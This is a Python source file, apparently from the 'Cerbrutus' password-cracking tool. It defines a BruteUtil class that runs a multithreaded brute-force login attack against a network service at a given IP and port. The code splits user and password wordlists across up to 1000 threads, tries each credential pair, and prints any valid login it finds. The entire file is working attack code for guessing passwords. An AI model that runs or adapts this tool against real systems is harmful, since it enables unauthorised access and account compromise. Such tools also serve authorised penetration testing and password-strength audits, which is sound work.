import threading
import time
import sys
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
import Cerbrutus.services as services
import Cerbrutus


class BruteUtil:
    MAX_THREADS = 1000

    def __init__(self, ip: str, port: int, service: str, users: list, passwords: list, threads: int = 10):
        # Validate IP
        if not isinstance(ip, str) or '.' not in ip:
            raise ValueError("The specified host to connect to does not seem to be a valid host.")
        self.ip = ip

        # Validate Port
        try:
            port = int(port)
        except Exception:
            raise ValueError("[-] The specified port is invalid (must be between 1 and 65535).")
        if not (1 <= port <= 65535):
            raise ValueError("[-] The specified port is invalid (must be between 1 and 65535).")
        self.port = port

        # Validate Service
        if not isinstance(service, str) or service.upper() not in services.valid_services:
            raise ValueError(f"[-] Service '{service}' not supported.")
        service_info = services.valid_services[service.upper()]
        self.service = service_info["class"]
        recommended_threads = service_info["reccomendedThreads"]

        if threads > recommended_threads:
            print(f"[!] Recommended threads for {service.upper()} is {recommended_threads}...")
        self.threads_num = min(threads, self.MAX_THREADS)
        print(f"[+] Running with {self.threads_num} threads...")

        # Validate Users
        if not isinstance(users, list) or not users:
            raise ValueError("[-] The users list is empty or invalid.")
        self.users = users

        # Validate Passwords
        if not isinstance(passwords, list) or not passwords:
            raise ValueError("[-] The passwords list is empty or invalid.")
        self.passwords = passwords

        # State
        self.creds_found = False
        self.lock = threading.Lock()
        self.start = None
        self.end = None
        self.total_attempts = len(users) * len(passwords)
        self.attempt_counter = 0
        self.stop_event = threading.Event()

    def test_connection(self):
        """Test if the target service is reachable."""
        if self.service.connect(self.ip, self.port, "test", "dummy_invalid_password_xyz123") is None:
            print(f"[-] Could not connect to {self.ip}:{self.port}... exiting!")
            sys.exit(1)

    def _partition(self, data, n):
        """Split passwords into n chunks."""
        k, m = divmod(len(data), n)
        return [data[i * k + min(i, m):(i + 1) * k + min(i + 1, m)] for i in range(n)]

    def _worker(self, user, chunk):
        for pwd in chunk:
            if self.creds_found or self.stop_event.is_set():
                return

            pwd_clean = Cerbrutus.Wordlist.clean_word(pwd)
            auth_result = self.service.connect(self.ip, self.port, user, pwd_clean)

            with self.lock:
                self.attempt_counter += 1
                sys.stdout.write(f"\r[*] Attempt {self.attempt_counter}/{self.total_attempts}")
                sys.stdout.flush()

            if auth_result:
                with self.lock:
                    if not self.creds_found:  # double-check after locking
                        self.creds_found = True
                        self.end = time.time()
                        print(f"\n{Fore.GREEN}[+] VALID CREDENTIALS: {user}:{pwd_clean}{Style.RESET_ALL}")
                        print(f"[*] Took {self.attempt_counter} tries in {(self.end - self.start):.2f} seconds.")
                        self.stop_event.set()  # Signal other workers to stop
                        return

    def brute(self):
        self.test_connection()
        print(f"[*] Starting brute force against {self.ip}:{self.port}")
        self.start = time.time()

        executor = ThreadPoolExecutor(max_workers=self.threads_num)
        try:
            futures = []
            for user in self.users:
                if self.creds_found or self.stop_event.is_set():
                    break
                print(f"[*] Testing user: {user}")
                partitions = self._partition(self.passwords, self.threads_num)
                for chunk in partitions:
                    if self.creds_found or self.stop_event.is_set():
                        break
                    future = executor.submit(self._worker, user, chunk)
                    futures.append(future)
            
            # A way to constantly run the main loop to listen out for termination signals (needed for Windows)
            while not (self.creds_found or self.stop_event.is_set()):
                if not any(not f.done() for f in futures):
                    break
                time.sleep(0.1)
        
        except KeyboardInterrupt:
            self.stop_event.set()
            print('\nCtrl+C pressed')
        
        finally:
            # Force shutdown without waiting if we found creds or got interrupted
            if self.creds_found or self.stop_event.is_set():
                executor.shutdown(wait=False)
            else:
                executor.shutdown(wait=True)

        if not self.creds_found:
            self.end = time.time()
            print(f"\n{Fore.RED}[-] Failed to find valid credentials.{Style.RESET_ALL}")
            print(f"[*] Total time: {(self.end - self.start):.2f} seconds.")
